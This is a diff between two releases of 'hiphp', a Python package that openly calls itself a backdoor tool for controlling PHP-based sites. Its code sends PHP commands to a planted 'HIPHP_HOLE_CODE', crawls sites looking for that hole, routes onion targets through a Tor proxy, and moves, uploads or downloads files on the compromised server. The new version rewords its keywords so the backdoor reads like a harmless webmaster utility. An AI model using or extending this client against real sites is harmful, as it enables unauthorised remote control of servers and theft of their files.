 from hiphp.hiphpphpfunctions import *
 from hiphp.hiphphelp import help
 from hiphp.hiphpmsgs import *
@@ -71,40 +73,45 @@
         self.c_green="#34a853"#green
         self.c_white="#ffffff"
         #
         self.set=""
         self.cd=""
         self.do_x=0
 
+        self.DS=""
+
         #
         self.sep=os.sep
 
-        self.DS=hiphp.do(self,self.key,self.url,self.headers,True,DIRECTORY_SEPARATOR())
-
         self.proxies=proxies
 
     #cli:
     def cli(self):
+        self.DS=hiphp.do(self,self.key,self.url,self.headers,True,DIRECTORY_SEPARATOR())
+        scanner="n"
+
         #logo
         logox=""
         if self.do_x==0:
             logox=logo(__version__)
             self.do_x+=1
 
         #getcwd
         getcwd=""
         try:
             reee=hiphp.do(self,self.key,self.url,self.headers,True,"echo getcwd();")
         except:
             reee=None
         
-        if (emsg_1 in reee) or (reee==None) or (emsg_3 in reee):
+        #if (emsg_1 in reee) or (reee==None) or (emsg_3 in reee):
+        if reee is None or (emsg_1 in reee or emsg_3 in reee):
             #print(reee)
             #exit()
             scanner=input(f"Scan '{self.url}' to find HIPHP_HOLE_CODE (Y/N):")
+            
             if scanner.lower()=="y":
                 def crawl(url):
                     #all_links=[]
                     #print(f"[*] Crawling: {url}")
                     links = get_all_website_links(url)
                     for link in links:
                         check_hiphp_in(link)
@@ -149,17 +156,19 @@
                         print(urls_list[i]+" Succeed!")
                         exit()
                     #print(p1)
                 exit()
                 """
             else:
                 #hiphp.get_hole(self,get=True)
+                exit()
                 return reee
         else:
             getcwd=self.color.c(reee,self.c_green)
+
         #
         xxr1=self.color.c('┌──(',self.c_blue)
         xxr2=self.color.c(')──[',self.c_blue)
         xxr3=self.color.c(']',self.c_blue)
         #xxr4=self.color.c('└─',self.c_blue)+" "
         xxr4=self.color.c('└─HIPHP>',self.c_blue)+" "
         #
@@ -188,14 +197,22 @@
                 exit()
             #license
             elif command[0:9].lower()=="--license" or command[0:7].lower()=="license":
                 print(license())
             #about
             elif command[0:7].lower()=="--about" or command[0:5].lower()=="about":
                 print(about())
+            #cp
+            elif command[0:4].lower()=="--mv" or command[0:2].lower()=="mv":
+                ppth=command.split(" ")
+                try:
+                    command=simulate_mv(ppth[1],ppth[2])
+                    print(hiphp.do(self,self.key,self.url,self.headers,True,command))
+                except:
+                    help(__version__,"--mv")
             #download
             elif command[0:6].lower()=="--down" or command[0:4].lower()=="down" or command[0:8].lower()=="download":
                 down=command.split(" ")
                 try:
                     if down[1].lower()=="-f":
                         """command=file_get_contents(down[2])
                         content=hiphp.do(self,self.key,self.url,self.headers,True,command)
@@ -391,15 +408,19 @@
                 comand_return=hiphp.do(self,self.key,self.url,self.headers,True,command)
                 if comand_return!="":
                     print(comand_return)
                 else:
                     self.color2.c(errx+" "+command+emsg_6,self.c_red)
         else:
             self.color2.c(emsg_2,self.c_red)
+        
+        #if scanner.lower()=="y":
         hiphp.cli(self)
+        #else:
+            #exit()
 
     #do:
     def do(self,key,url,header,retu,command):
         regex = re.compile(r"^https?\:\/\/[\w\-\.]+\.onion")
         proxies_onion = {'http': 'socks5h://127.0.0.1:9150','https': 'socks5h://127.0.0.1:9150'}
         try:
             if regex.match(url):
@@ -474,14 +495,15 @@
         if self.retu==True:
             return hiphp.do(self,self.key,self.url,self.headers,True,command)
         else:
             hiphp.do(self,self.key,self.url,self.headers,False,command)
 
     #upload:
     def upload(self,path_to_upluad,to=""):
+        self.DS=hiphp.do(self,self.key,self.url,self.headers,True,DIRECTORY_SEPARATOR())
         try:
             with open(path_to_upluad,"rb") as base64_file:
                 encoded_string=tobase64(base64_file.read().decode("utf-8"))
             p=""
             if to!="":
                 if to[0:2]!="."+self.DS:
                     p="."+self.DS
@@ -499,18 +521,35 @@
         zip_file_name=hiphp.do(self,self.key,self.url,self.headers,True,command)
         if self.retu==False:
             print(zip_file_name)
         return zip_file_name
 
     #download:
     def download(self,path_x,outpath=""):
+        def get_download_folder():
+            if os.name == 'nt':  # Windows
+                download_folder = os.path.expanduser('~/Downloads')
+            elif os.name == 'posix':  # Linux, macOS, and other UNIX-based systems
+                download_folder = os.path.expanduser('~/Downloads')
+            else:
+                # Unsupported operating system
+                download_folder = None
+
+            return download_folder
+        download_folder = get_download_folder()
+        if download_folder:
+            outpath=download_folder
+        else:
+            outpath=os.path.abspath(os.getcwd())
+
+
         new_command=file_to_b64(path_x)
         path_x=os.path.basename(path_x)
-        if outpath=="":
-            outpath=os.path.abspath(os.getcwd())
+        #if outpath=="":
+        #    outpath=os.path.abspath(os.getcwd())
         
         if outpath[-1]!=self.sep:
             outpath+=self.sep
 
         down_path=outpath+""+path_x
 
         zip_file_b64_content=hiphp.do(self,self.key,self.url,self.headers,True,new_command)
```

### Comparing `hiphp-0.3.1/hiphp/hiphpeditor.py` & `hiphp-0.3.2/hiphp/hiphpeditor.py`

 * *Files 13% similar despite different names*

```diff
@@ -1,19 +1,21 @@
 #!/usr/bin/env python
 # coding:utf-8
-#   |                                                          |
-# --+----------------------------------------------------------+--
-#   |   Code by : yasserbdj96                                  |
-#   |   Email   : yasser.bdj96@gmail.com                       |
-#   |   Github  : https://github.com/yasserbdj96               |
-#   |   BTC     : bc1q2dks8w8uurca5xmfwv4jwl7upehyjjakr3xga9   |
-# --+----------------------------------------------------------+--  
-#   |        all posts #yasserbdj96 ,all views my own.         |
-# --+----------------------------------------------------------+--
-#   |                                                          |
+#   |                                                         |   #
+# --+---------------------------------------------------------+-- #
+#   |    Code by: yasserbdj96                                 |   #
+#   |    Email: yasser.bdj96@gmail.com                        |   #
+#   |    GitHub: github.com/yasserbdj96                       |   #
+#   |    Sponsor: github.com/sponsors/yasserbdj96             |   #
+#   |    BTC: bc1q2dks8w8uurca5xmfwv4jwl7upehyjjakr3xga9      |   #
+#   |                                                         |   #
+#   |    All posts with #yasserbdj96                          |   #
+#   |    All views are my own.                                |   #
+# --+---------------------------------------------------------+-- #
+#   |                                                         |   #
 
 # Link to the source code of this file: https://github.com/maksimKorzh/edit
 # This code has been modified by: yasserbdj96 (https://github.com/yasserbdj96)
 
 #START{
 def editor(stdscr):
   import curses, traceback
```

### Comparing `hiphp-0.3.1/hiphp/hiphphelp.py` & `hiphp-0.3.2/hiphp/hiphphelp.py`

 * *Files 15% similar despite different names*

```diff
@@ -1,144 +1,146 @@
 #!/usr/bin/env python
 # coding:utf-8
-#   |                                                          |
-# --+----------------------------------------------------------+--
-#   |   Code by : yasserbdj96                                  |
-#   |   Email   : yasser.bdj96@gmail.com                       |
-#   |   Github  : https://github.com/yasserbdj96               |
-#   |   BTC     : bc1q2dks8w8uurca5xmfwv4jwl7upehyjjakr3xga9   |
-# --+----------------------------------------------------------+--  
-#   |        all posts #yasserbdj96 ,all views my own.         |
-# --+----------------------------------------------------------+--
-#   |                                                          |
+#   |                                                         |   #
+# --+---------------------------------------------------------+-- #
+#   |    Code by: yasserbdj96                                 |   #
+#   |    Email: yasser.bdj96@gmail.com                        |   #
+#   |    GitHub: github.com/yasserbdj96                       |   #
+#   |    Sponsor: github.com/sponsors/yasserbdj96             |   #
+#   |    BTC: bc1q2dks8w8uurca5xmfwv4jwl7upehyjjakr3xga9      |   #
+#   |                                                         |   #
+#   |    All posts with #yasserbdj96                          |   #
+#   |    All views are my own.                                |   #
+# --+---------------------------------------------------------+-- #
+#   |                                                         |   #
 
 #START{
 def help(__version__,opt=""):
   #
   spsbar=""""""
 
   #
-  header=f"""hiphp V{__version__} - (C) 2010-2022 yasserbdj96 https://github.com/yasserbdj96/hiphp
-
-  Command                            Description
-  -------                            -----------"""
+  header=f"""HIPHP v{__version__} - (C) 2010-2023 yasserbdj96
+GitHub: https://github.com/yasserbdj96/hiphp
+"""
 
   #
   OPTIONS="""
-[OPTIONS]
+Commands:
 
-  --help, help                       ─> # Display this help.
-  --help [ACTIONS], help [ACTIONS]   ─> # Help for a specific command.
-  --geth, geth                       ─> # Get the hole Code, "HIPHP_HOLE_CODE" It has the same purpose.
-  --phpinfo, phpinfo                 ─> # Some information about the server.
-  --cls, cls                         ─> # Clear console.
-  --exit, exit                       ─> # Exit this console.
+  --help, help                       # Display this help.
+  --help [ACTIONS], help [ACTIONS]   # Help for a specific command.
+  --geth, geth                       # Get the HIPHP_HOLE_CODE (same purpose as --geth).
+  --phpinfo, phpinfo                 # Display information about the server.
+  --cls, cls                         # Clear the console.
+  --exit, exit                       # Exit the console.
 """
 
   #
   ACTIONS="""
-[ACTIONS]
+Actions:
 """
 
   #
   ls_c="""
-  --ls, ls                           ─> # List information about the FILEs (the current directory by default).
+  --ls, ls                           # List files and folders (current directory by default).
   Usage: --ls [OPTION] [PATH], ls [OPTION] [PATH]
-  Mandatory arguments to long options:
-    --ls                             ─> # Get a list of all files and folders from the current directory.
-    --ls [PATH]                      ─> # Get a list of all files and folders from a specified directory.
-    --ls -all                        ─> # Get a list of all files, folders and subfolders from the current directory.
-    --ls -all [PATH]                 ─> # Get a list of all files, folders and subfolders from a specified directory.
+    --ls                             # List all files and folders in the current directory.
+    --ls [PATH]                      # List all files and folders in the specified directory.
+    --ls -all                        # List all files, folders, and subfolders in the current directory.
+    --ls -all [PATH]                 # List all files, folders, and subfolders in the specified directory.
 """
 
   #
   cat_c="""
-  --cat, cat                         ─> # Concatenate FILE to standard output.
+  --cat, cat                         # Concatenate a file to standard output.
   Usage: --cat [FILE_PATH]
 """
 
   #
   set_c="""
-  --set, set                         ─> # Create a code that is always saved on during work.
+  --set, set                         # Create a code snippet that is always saved during work.
   Usage: --set [PHP_CODE]
-  You can return the initial value with "--dset" or "dset".
+  To reset to the initial value, use "--dset" or "dset".
 """
 
   #
   cd_c="""
-  --cd, cd                           ─> # Change directory.
+  --cd, cd                           # Change directory.
   Usage: --cd [PATH]
 """
 
   #
   rf_c="""
-  --rf, rf, run                      ─> # Run code from file.
+  --rf, rf, run                      # Run code from a file.
   Usage: --rf [FILE_PATH] [VARIABLES]
-  Mandatory arguments to long options:
-    --rf [FILE_PATH]                 ─> # Run code from file.
-    --rf [FILE_PATH] [VARIABLES]     ─> # Run code from file with variables, EX: --rf example.php var==hello
+    --rf [FILE_PATH]                 # Run code from a file.
+    --rf [FILE_PATH] [VARIABLES]     # Run code from a file with variables (e.g., --rf example.php var==hello).
   """
 
   #
   up_c="""
-  --up, up, upload                   ─> # Upload a file.
+  --up, up, upload                   # Upload a file.
   Usage: --up [FILE_PATH] [PATH]
-  Mandatory arguments to long options:
-    --up [FILE_PATH]                 ─> # Upload a file to the current directory.
-    --up [FILE_PATH] [PATH]          ─> # Upload a file to a specified directory.
+    --up [FILE_PATH]                 # Upload a file to the current directory.
+    --up [FILE_PATH] [PATH]          # Upload a file to a specified directory.
 """
 
   #
   down_c="""
-  --down, down, download             ─> # download a file.
+  --down, down, download             # Download a file.
   Usage: --down [-f/-d] [FILE/DIR_PATH] [OUT_PATH]
-  Mandatory arguments to long options:
-    --down -f [FILE_PATH]            ─> # Download a file to the current directory.
-    --down -f [FILE_PATH] [OUT_PATH] ─> # Download file to a specified directory.
-    --down -d [DIR_PATH]             ─> # Download a folder to the current directory.
-    --down -d [DIR_PATH] [OUT_PATH]  ─> # Download folder to a specified directory.
-    --down -all                      ─> # Download all files to the current directory.
-    --down -all [OUT_PATH]           ─> # Download all files to a specified directory.
+    --down -f [FILE_PATH]            # Download a file to the current directory.
+    --down -f [FILE_PATH] [OUT_PATH] # Download a file to a specified directory.
+    --down -d [DIR_PATH]             # Download a folder to the current directory.
+    --down -d [DIR_PATH] [OUT_PATH]  # Download a folder to a specified directory.
+    --down -all                      # Download all files to the current directory.
+    --down -all [OUT_PATH]           # Download all files to a specified directory.
 """
 
   #
   zip_c="""
-  --zip, zip                         ─> # Compress a directory.
+  --zip, zip                         # Compress a directory.
   Usage: --zip [DIR_PATH]
-  Mandatory arguments to long options:
-    --zip                            ─> # Compress the current directory.
-    --zip [DIR_PATH]                 ─> # Compress a specific directory.
+    --zip                            # Compress the current directory.
+    --zip [DIR_PATH]                 # Compress a specific directory.
 """
 
 #
   edt_c="""
-  --edt, edt, edit                   ─> # To edit files.
+  --edt, edt, edit                   # Edit files.
   Usage: --edt [FILE_PATH]
-  Mandatory arguments to long options:
-    CTRL+q                           ─> # To exit.
-    CTRL+s                           ─> # To save.
+    CTRL+q                           # Exit the editor.
+    CTRL+s                           # Save the changes.
 """
 
 #
   rm_c="""
-  --rm, rm, delete                   ─> # To delete files and folders.
+  --rm, rm, delete                   # Delete files and folders.
   Usage: --rm [-f/-d] [FILE/DIR_PATH]
-  Mandatory arguments to long options:
-    --rm -f [FILE_PATH]              ─> # Delete a file.
-    --rm -d [DIR_PATH]               ─> # Delete a folder.
+    --rm -f [FILE_PATH]              # Delete a file.
+    --rm -d [DIR_PATH]               # Delete a folder.
 """
+
+#
+  mv_c="""
+  --mv, mv                           # Move files and folders.
+  Usage: --mv [SOURCE] [DESTINATION]
+"""
+
   #
   ABOUT="""
-[ABOUT]
+About:
+
+  --update, update                   # Check for updates.
+  --license, license                 # View the project license.
+  --about, about                     # About this project.
+  --version, version                 # Get the current version number."""
 
-  --update, update                   ─> # check for updates.
-  --license, license                 ─> # This project license.
-  --about, about                     ─> # About this project.
-  --version, version                 ─> # Get the version number you are working with."""
   if opt=="":
-    return header+OPTIONS+ACTIONS+ls_c+spsbar+cat_c+spsbar+set_c+spsbar+cd_c+spsbar+rf_c+spsbar+up_c+spsbar+down_c+spsbar+zip_c+spsbar+edt_c+spsbar+rm_c+spsbar+ABOUT
+    return header+OPTIONS+ACTIONS+ls_c+spsbar+cat_c+spsbar+set_c+spsbar+cd_c+spsbar+rf_c+spsbar+up_c+spsbar+down_c+spsbar+zip_c+spsbar+edt_c+spsbar+rm_c+spsbar+mv_c+spsbar+ABOUT
   else:
     opt=opt.replace("--","")
     opt=opt+"_c"
     x=""
     exec(f"print({opt})")
 #}END.
```

#### encoding

```diff
@@ -1 +1 @@
-utf-8
+us-ascii
```

### Comparing `hiphp-0.3.1/hiphp/hiphplinkextractor.py` & `hiphp-0.3.2/hiphp/hiphplinkextractor.py`

 * *Files 16% similar despite different names*

```diff
@@ -1,19 +1,21 @@
 #!/usr/bin/env python
 # coding:utf-8
-#   |                                                          |
-# --+----------------------------------------------------------+--
-#   |   Code by : yasserbdj96                                  |
-#   |   Email   : yasser.bdj96@gmail.com                       |
-#   |   Github  : https://github.com/yasserbdj96               |
-#   |   BTC     : bc1q2dks8w8uurca5xmfwv4jwl7upehyjjakr3xga9   |
-# --+----------------------------------------------------------+--  
-#   |        all posts #yasserbdj96 ,all views my own.         |
-# --+----------------------------------------------------------+--
-#   |                                                          |
+#   |                                                         |   #
+# --+---------------------------------------------------------+-- #
+#   |    Code by: yasserbdj96                                 |   #
+#   |    Email: yasser.bdj96@gmail.com                        |   #
+#   |    GitHub: github.com/yasserbdj96                       |   #
+#   |    Sponsor: github.com/sponsors/yasserbdj96             |   #
+#   |    BTC: bc1q2dks8w8uurca5xmfwv4jwl7upehyjjakr3xga9      |   #
+#   |                                                         |   #
+#   |    All posts with #yasserbdj96                          |   #
+#   |    All views are my own.                                |   #
+# --+---------------------------------------------------------+-- #
+#   |                                                         |   #
 
 #START{
 import requests
 from urllib.parse import urlparse, urljoin
 from bs4 import BeautifulSoup
 
 # initialize the set of links (unique links)
```

### Comparing `hiphp-0.3.1/hiphp/hiphplogo.py` & `hiphp-0.3.2/hiphp/hiphplogo.py`

 * *Files 14% similar despite different names*

```diff
@@ -1,19 +1,21 @@
 #!/usr/bin/env python
 # coding:utf-8
-#   |                                                          |
-# --+----------------------------------------------------------+--
-#   |   Code by : yasserbdj96                                  |
-#   |   Email   : yasser.bdj96@gmail.com                       |
-#   |   Github  : https://github.com/yasserbdj96               |
-#   |   BTC     : bc1q2dks8w8uurca5xmfwv4jwl7upehyjjakr3xga9   |
-# --+----------------------------------------------------------+--  
-#   |        all posts #yasserbdj96 ,all views my own.         |
-# --+----------------------------------------------------------+--
-#   |                                                          |
+#   |                                                         |   #
+# --+---------------------------------------------------------+-- #
+#   |    Code by: yasserbdj96                                 |   #
+#   |    Email: yasser.bdj96@gmail.com                        |   #
+#   |    GitHub: github.com/yasserbdj96                       |   #
+#   |    Sponsor: github.com/sponsors/yasserbdj96             |   #
+#   |    BTC: bc1q2dks8w8uurca5xmfwv4jwl7upehyjjakr3xga9      |   #
+#   |                                                         |   #
+#   |    All posts with #yasserbdj96                          |   #
+#   |    All views are my own.                                |   #
+# --+---------------------------------------------------------+-- #
+#   |                                                         |   #
 
 #START{
 from hexor import *
 from biglibrary import *
 
 # logo:
 def logo(__version__):
@@ -39,19 +41,21 @@
     logox+="\n"
     logox+=color.c(bl.center("║   ║  ║    ███          ███    ███     ███       "),c_red)
     logox+="\n"
     logox+=color.c(bl.center("╩   ╩ ═╩═  ▄████▀        ███    █▀     ▄████▀     "),c_red)
     logox+="\n"
     logox+=color.c(bl.center("+-----------------------------------------------------------------------------------+"),c_red)
     logox+="\n"
-    logox+=color.c(bl.center(f"hiphp - free & open source project for create a BackDoor to control PHP-based sites."),c_yellow)
+    logox+=color.c(bl.center(f"HIPHP - Free & Open Source Project"),c_yellow)
     logox+="\n"
-    logox+=color.c(bl.center(f"hiphp v{__version__} by yasserbdj96"),c_green)
+    logox+=color.c(bl.center(f"A Backdoor Tool for Controlling PHP-based Sites"),c_yellow)
     logox+="\n"
-    logox+=color.c(bl.center(f"https://yasserbdj96.github.io/hiphp/"),c_blue)
+    logox+=color.c(bl.center(f"Version: {__version__} by yasserbdj96"),c_green)
+    logox+="\n"
+    logox+=color.c(bl.center(f"Visit: https://yasserbdj96.github.io/hiphp/"),c_blue)
     logox+="\n"
     logox+=color.c(bl.center("+-----------------------------------------------------------------------------------+"),c_red)
     logox+="\n"
     logox+=color.c("\n [!] '--help' for more informations.\n",c_yellow)
     logox+=color.c(" [!] '--exit' OR 'Ctrl+C' for exit.\n",c_yellow)
     #logox+="\n"
```

### Comparing `hiphp-0.3.1/hiphp/hiphpphpfunctions.py` & `hiphp-0.3.2/hiphp/hiphpphpfunctions.py`

 * *Files 6% similar despite different names*

```diff
@@ -1,19 +1,21 @@
 #!/usr/bin/env python
 # coding:utf-8
-#   |                                                          |
-# --+----------------------------------------------------------+--
-#   |   Code by : yasserbdj96                                  |
-#   |   Email   : yasser.bdj96@gmail.com                       |
-#   |   Github  : https://github.com/yasserbdj96               |
-#   |   BTC     : bc1q2dks8w8uurca5xmfwv4jwl7upehyjjakr3xga9   |
-# --+----------------------------------------------------------+--  
-#   |        all posts #yasserbdj96 ,all views my own.         |
-# --+----------------------------------------------------------+--
-#   |                                                          |
+#   |                                                         |   #
+# --+---------------------------------------------------------+-- #
+#   |    Code by: yasserbdj96                                 |   #
+#   |    Email: yasser.bdj96@gmail.com                        |   #
+#   |    GitHub: github.com/yasserbdj96                       |   #
+#   |    Sponsor: github.com/sponsors/yasserbdj96             |   #
+#   |    BTC: bc1q2dks8w8uurca5xmfwv4jwl7upehyjjakr3xga9      |   #
+#   |                                                         |   #
+#   |    All posts with #yasserbdj96                          |   #
+#   |    All views are my own.                                |   #
+# --+---------------------------------------------------------+-- #
+#   |                                                         |   #
 
 #START{
 #
 def scandir(dirx="./"):
     x="""
 $path='"""+dirx+"""';
 if(!is_dir($path)) {
@@ -138,14 +140,50 @@
 }
 echo json_encode(getDirContents('"""+dirx+"""'));"""
     return x
 #
 def file_get_contents(dirx):
     return f"""echo file_get_contents('{dirx}');"""
 
+def simulate_mv(path, newpath):
+    php_code = f"""
+    // Check if the source file or directory exists
+    if (!file_exists('{path}')) {{
+        echo "[✗] Source doesn't exist.";
+        return;
+    }}
+
+    // Check if the destination exists
+    if (file_exists('{newpath}')) {{
+        echo "[!] Destination already exists. Please choose a different destination.";
+        return;
+    }}
+
+    // Check if the source is a file
+    if (is_file('{path}')) {{
+        // Move the file to the destination
+        if (rename('{path}', '{newpath}')) {{
+            echo "[✓] File moved successfully.";
+        }} else {{
+            echo "[✗] Error moving the file.";
+        }}
+    }} elseif (is_dir('{path}')) {{
+        // Move the directory to the destination
+        if (mkdir('{newpath}') && rename('{path}', '{newpath}/' . basename('{path}'))) {{
+            echo "[✓] Directory moved successfully.";
+        }} else {{
+            echo "[✗] Error moving the directory.";
+        }}
+    }} else {{
+        echo "[✗] Unsupported source type.";
+    }}
+    """
+
+    return php_code
+
 #
 def zip_path(path="./"):
     php_zip_code="""// Get real path for our folder
 $rootPath = realpath('"""+path+"""');
 
 $path_name=str_replace(DIRECTORY_SEPARATOR, '_', '"""+path+"""');
```

### Comparing `hiphp-0.3.1/hiphp.egg-info/PKG-INFO` & `hiphp-0.3.2/hiphp.egg-info/PKG-INFO`

 * *Files 3% similar despite different names*

```diff
@@ -1,27 +1,28 @@
 Metadata-Version: 2.1
 Name: hiphp
-Version: 0.3.1
+Version: 0.3.2
 Summary: hiphp - free & open source project for create a BackDoor to control PHP-based sites.
 Home-page: UNKNOWN
 Author: yasserbdj96
 Author-email: yasser.bdj96@gmail.com
-License: Apache Software License
+License: MIT License
 Project-URL: Source, https://github.com/yasserbdj96/hiphp
 Project-URL: WebSite, https://yasserbdj96.github.io/hiphp
 Project-URL: Documentation, https://yasserbdj96.github.io/hiphp
 Project-URL: Chat, https://gitter.im/yasserbdj96/hiphp
 Project-URL: Author WebSite, https://yasserbdj96.github.io/
-Keywords: python,windows,macos,linux,docker,cli,php,remoteaccess,website,gui,backdoor,controller,https,declarative,hacking,http-requests,onion,termux,payload,revisioncontrol
+Project-URL: Sponsor, https://github.com/sponsors/yasserbdj96
+Keywords: HIPHP BackDoor,Open-source tool,Remote control,PHP programming,HTTP/HTTPS protocol,POST/GET method,Port 80,File download,File editing,Tor networks,Password protection,Webmasters,Third-party software,User-friendly,Access rights,Directory structure,Flexibility,Security,Compatibility,Content management
 Platform: UNKNOWN
 Classifier: Environment :: Web Environment
 Classifier: Development Status :: 5 - Production/Stable
 Classifier: Intended Audience :: Developers
 Classifier: Natural Language :: English
-Classifier: License :: OSI Approved :: Apache Software License
+Classifier: License :: OSI Approved :: MIT License
 Classifier: Programming Language :: Python
 Classifier: Programming Language :: Python :: 3
 Classifier: Programming Language :: Python :: 3.7
 Classifier: Programming Language :: Python :: 3.8
 Classifier: Programming Language :: Python :: 3.9
 Classifier: Programming Language :: Python :: 3.10
 Classifier: Programming Language :: Python :: 3.11
@@ -29,15 +30,14 @@
 Classifier: Operating System :: Unix
 Classifier: Operating System :: MacOS :: MacOS X
 Classifier: Operating System :: Microsoft :: Windows
 Classifier: Topic :: Software Development :: Build Tools
 Classifier: Topic :: Software Development :: Libraries
 Classifier: Topic :: Software Development :: Libraries :: Python Modules
 Classifier: Topic :: Internet :: WWW/HTTP
-Requires-Python: >=3.x.x
 Description-Content-Type: text/markdown
 License-File: LICENSE
 
 <div align="center">
   <br><img align="center" height="200" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/install/hiphp.png" alt="hiphp by yasserbdj96">
   <h1>Hiphp</h1>
   <strong>Free & Open source project for create a BackDoor to control PHP-based sites.</strong>
@@ -152,14 +152,15 @@
 [✓] <a href="https://pypi.org/project/hexor/">hexor</a><br>
 [✓] <a href="https://pypi.org/project/biglibrary/">biglibrary</a><br>
 [✓] <a href="https://pypi.org/project/tk/">tk</a><br>
 [✓] <a href="https://pypi.org/project/Eel/">eel</a><br>
 [✓] <a href="https://pypi.org/project/readline/">readline</a><br>
 [✓] <a href="https://pypi.org/project/chardet/">chardet</a>
 
+
 <br>
 <h2>Python Package Installation:</h2>
 
 ```bash
 # Install from PYPI:
 ❯ pip install hiphp
 # OR
@@ -170,15 +171,15 @@
 ❯ git clone https://github.com/yasserbdj96/hiphp.git
 # OR
 # Download hiphp from gitlab:
 ❯ git clone https://gitlab.com/yasserbdj96/hiphp.git
 # Go to downloaded folder:
 ❯ cd hiphp
 # install
-❯ pip install -r requirements-pypi.txt
+❯ pip install -r requirements.txt
 ❯ sudo python setup.py install
 
 # Uninstall:
 ❯ pip uninstall hiphp
 ```
 
 <p>click to see <a href="https://asciinema.org/a/a8DVPENs0gGfrPhBmUGRWPYZG">Demo</a></p><br>
@@ -301,23 +302,17 @@
 
 <br>
 <h2>License:</h2>
 <p>The content of this repository is bound by the following <a href="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/LICENSE">LICENSE</a>.</p>
 
 <br>
 <h2>Support:</h2>
-<p>If you like `hiphp` and want to see it improve furthur or want me to create intresting projects , You can buy me a coffee </p>
-<div align="center">
-    <a href="https://ko-fi.com/yasserbdj96">
-        <img src="https://ko-fi.com/img/githubbutton_sm.svg" alt="hiphp by yasserbdj96">
-    </a><br>
-    BTC: bc1q2dks8w8uurca5xmfwv4jwl7upehyjjakr3xga9<br>
-</div>
-
-<br><br>
+<p>If you enjoy this project and would like to see it continue to improve, or if you would like me to create more interesting projects, please consider <a href="https://github.com/sponsors/yasserbdj96">sponsoring me</a>.</p>
+<br>
+<br>
 
 <p align="center">
   <samp>
     <a href="https://yasserbdj96.github.io/">website</a> .
     <a href="https://github.com/yasserbdj96">github</a> .
     <a href="https://gitlab.com/yasserbdj96">gitlab</a> .
     <a href="https://www.linkedin.com/in/yasserbdj96">linkedin</a> .
@@ -326,12 +321,12 @@
     <a href="https://www.facebook.com/yasserbdj96">facebook</a> .
     <a href="https://www.youtube.com/@yasserbdj96">youtube</a> .
     <a href="https://pypi.org/user/yasserbdj96">pypi</a> .
     <a href="https://hub.docker.com/u/yasserbdj96">docker</a> .
     <a href="https://t.me/yasserbdj96">telegram</a> .
     <a href="https://gitter.im/yasserbdj96/yasserbdj96">gitter</a> .
     <a href="mailto:yasser.bdj96@gmail.com">e-mail</a> .
-    <a href="https://ko-fi.com/yasserbdj96">sponsor</a>
+    <a href="https://github.com/sponsors/yasserbdj96">sponsor</a>
   </samp>
 </p>
```

### Comparing `hiphp-0.3.1/setup.py` & `hiphp-0.3.2/setup.py`

 * *Files 15% similar despite different names*

```diff
@@ -1,49 +1,52 @@
 #!/usr/bin/env python
 # coding:utf-8
-#   |                                                          |
-# --+----------------------------------------------------------+--
-#   |   Code by : yasserbdj96                                  |
-#   |   Email   : yasser.bdj96@gmail.com                       |
-#   |   Github  : https://github.com/yasserbdj96               |
-#   |   BTC     : bc1q2dks8w8uurca5xmfwv4jwl7upehyjjakr3xga9   |
-# --+----------------------------------------------------------+--  
-#   |        all posts #yasserbdj96 ,all views my own.         |
-# --+----------------------------------------------------------+--
-#   |                                                          |
+#   |                                                         |   #
+# --+---------------------------------------------------------+-- #
+#   |    Code by: yasserbdj96                                 |   #
+#   |    Email: yasser.bdj96@gmail.com                        |   #
+#   |    GitHub: github.com/yasserbdj96                       |   #
+#   |    Sponsor: github.com/sponsors/yasserbdj96             |   #
+#   |    BTC: bc1q2dks8w8uurca5xmfwv4jwl7upehyjjakr3xga9      |   #
+#   |                                                         |   #
+#   |    All posts with #yasserbdj96                          |   #
+#   |    All views are my own.                                |   #
+# --+---------------------------------------------------------+-- #
+#   |                                                         |   #
 
 #START{
 from hiphp.hiphpversion import __version__
 from setuptools import setup,find_packages
 
 setup(
     name="hiphp",
     version=__version__,
     author="yasserbdj96",
     author_email="yasser.bdj96@gmail.com",
     description='''hiphp - free & open source project for create a BackDoor to control PHP-based sites.''',
     long_description_content_type="text/markdown",
     long_description=open('README_PYPI.md','r', encoding="utf8").read(),
-    license='''Apache Software License''',
+    license='''MIT License''',
     packages=find_packages(),
     project_urls={
         'Source': "https://github.com/yasserbdj96/hiphp",
         'WebSite': "https://yasserbdj96.github.io/hiphp",
         'Documentation': "https://yasserbdj96.github.io/hiphp",
         'Chat': "https://gitter.im/yasserbdj96/hiphp",
-        'Author WebSite':"https://yasserbdj96.github.io/"
+        'Author WebSite':"https://yasserbdj96.github.io/",
+        'Sponsor': "https://github.com/sponsors/yasserbdj96"
     },
-    install_requires=["requests","hexor","biglibrary","BeautifulSoup4"],
-    keywords=["python","windows","macos","linux","docker","cli","php","remoteaccess","website","gui","backdoor","controller","https","declarative","hacking","http-requests","onion","termux","payload","revisioncontrol"],
+    install_requires=["requests","hexor","biglibrary","BeautifulSoup4","asciitext"],
+    keywords = ["HIPHP BackDoor", "Open-source tool", "Remote control", "PHP programming", "HTTP/HTTPS protocol", "POST/GET method", "Port 80", "File download", "File editing", "Tor networks", "Password protection", "Webmasters", "Third-party software", "User-friendly", "Access rights", "Directory structure", "Flexibility", "Security", "Compatibility", "Content management"],
     classifiers=[
         "Environment :: Web Environment",
         "Development Status :: 5 - Production/Stable",
         "Intended Audience :: Developers",
         "Natural Language :: English",
-        "License :: OSI Approved :: Apache Software License",
+        "License :: OSI Approved :: MIT License",
         "Programming Language :: Python",
         "Programming Language :: Python :: 3",
         "Programming Language :: Python :: 3.7",
         "Programming Language :: Python :: 3.8",
         "Programming Language :: Python :: 3.9",
         "Programming Language :: Python :: 3.10",
         "Programming Language :: Python :: 3.11",
@@ -52,10 +55,10 @@
         "Operating System :: MacOS :: MacOS X",
         "Operating System :: Microsoft :: Windows",
         "Topic :: Software Development :: Build Tools",
         "Topic :: Software Development :: Libraries",
         "Topic :: Software Development :: Libraries :: Python Modules",
         "Topic :: Internet :: WWW/HTTP"
     ],
-    python_requires=">=3.x.x"
+    #python_requires=">=3.9"
 )
 #}END.
```

